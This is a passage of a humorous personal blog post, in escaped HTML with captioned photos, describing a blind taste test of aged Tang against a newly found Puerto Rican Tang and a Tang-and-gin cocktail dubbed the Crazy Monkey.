&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_09.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Andrew took a more direct approach.&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_06.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;We mixed a pitcher up to give it a proper tasting.&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_07.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;I don&#039;t get many pictures of myself on this site.&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_08.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;I&#039;m kind of a goofy looking dude.&lt;/div&gt;

&lt;p&gt;Ok, so it tasted good.  It tasted really good. But did it really taste like Olde Tang? We couldn&#039;t be sure.  Not without a taste test, that is! I prepared a sample of the Puerto Rican Tang, to scientifically measured proportions.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_12.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;In a scientific flamingo cup.&lt;/div&gt;

&lt;p&gt;Then I went into the super-secure locked up archive Tang that I&#039;ve been saving inside a mountain in case I really needed some.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_13.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Probably three years old.&lt;/div&gt;

&lt;p&gt;I carefully prepared the two identical glasses (to make sure neither of us were at all biased).&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_14.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Andrew waited patiently.&lt;/div&gt;

&lt;p&gt;I chipped off a few chunks of the Olde Tang (once it hits a couple months old, it kind of hardens into a sort of prehistoric, petrified Tang rock), and ground it back into a powder.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_15.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Not as pretty as the new-comer, but looks aren&#039;t everything.&lt;/div&gt;

&lt;p&gt;Ready to go, the two cups were pretty much identical.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_16.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Which is more delicious?&lt;/div&gt;

&lt;p&gt;As scientifically as possible, I tasted each one.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_17.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;I no longer have that goatee.&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_18.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/drink.gif&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_22.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;

&lt;p&gt;Here&#039;s what Andrew and I agreed on. First off, there were differences between the two drinks. That could certainly have been attributed to the archive Olde Tang losing a bit with age, for sure. They were both good, but one was pretty clearly better. One of them was a little grittier, which I figured was the Olde Tang not mixing particularly well, but after thoroughly re-mixing it, it tasted better than the other one. It would seem that the newcomer was not quite as good as Olde Tang, but it was definitely good &lt;em&gt;enough&lt;/em&gt;. Andrew wanted to verify which was which, but I couldn&#039;t. I had to make it completely untraceable, or my overly-critical mind would be immediately tainted by knowing which was which. He was frustrated that we wouldn&#039;t be able to know for sure which was better (although I was pretty sure that the difficulty of mixing the one proved which it was).&lt;/p&gt;

&lt;p&gt;I remembered that knife he was sharpening earlier, and decided to make an effort to find out.&lt;/p&gt;

&lt;p&gt;Then I remembered that we had been taking pictures the whole time. Duh. I looked at the two cups, and sure enough, one of them - the one which tasted better, in fact - had considerably more worn flamingos than the other one. I checked the footage and compared the flamingo wear patterns to the cups.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_15.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Olde Tang. Intact Flamingos.&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_12.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Newcomer. Faded Flamingos.&lt;/div&gt;

&lt;p&gt;&quot;Andrew . . .&quot; I said. &quot;The faded flamingos were on the New Tang . . .&quot;&lt;/p&gt;

&lt;p&gt;A Jump Ten was all that could express our excitement. Nobody was around to take a picture of it, unfortunately, but rest assured it was &lt;em&gt;awesome&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The New New Tang was the one we liked better. My life is finally complete.&lt;/p&gt;

&lt;p&gt;So, as a guiding light for the rest of the world, more than a year after this whole fiasco started, I give you the solution (for now, until Puerto Rico gets wise). A couple weeks later, a giant box arrived in the mail. Andrew had ordered an entire case of the New New Tang from the same store he bought the first one from. Opening that box of twelve wonderful canisters was one of the highlights of my life.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_23.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Tang is back.&lt;/div&gt;

&lt;p&gt;As a side note, with this boon of Tang, we&#039;ve explored new possible applications for the delicious no-longer-just-breakfast drink. John, whom you might remember from our Mixed Mithai adventure, is a fan of high-class, expensive alcohol, particularly Gin. Late one night, while I was getting a midnight snack of a glass of Tang, and John was getting a midnight snack of a glass of Boodles British Gin, we accidentally ran into each other, mixing the two.&lt;/p&gt;

&lt;p&gt;&quot;Hey, you got Boodles in my Tang!&quot;&lt;/p&gt;

&lt;p&gt;&quot;Hey, you got Tang in my Boodles!&quot;&lt;/p&gt;

&lt;p&gt;&quot;Heyyyy!&quot;&lt;/p&gt;

&lt;p&gt;The Crazy Monkey was born.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/mcgill_photo.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Boodles and Tang: The Crazy Monkey&lt;/div&gt;

&lt;p&gt;Yes, I&#039;ve tried it, and yes it&#039;s pretty delicious.&lt;/p&gt;

&lt;p&gt;One more side-note: someone who happened upon my Tang article emailed me a few days ago. He was a big fan of the Tang-ish drink Sunny Delight, and he said that it has recently gone the &quot;fruitrition&quot; route, following Tang where consumers are unable to follow. What are drink-makers thinking?&lt;/p&gt;

&lt;p&gt;And people wonder why the economy is a complete mess.&lt;/p&gt;

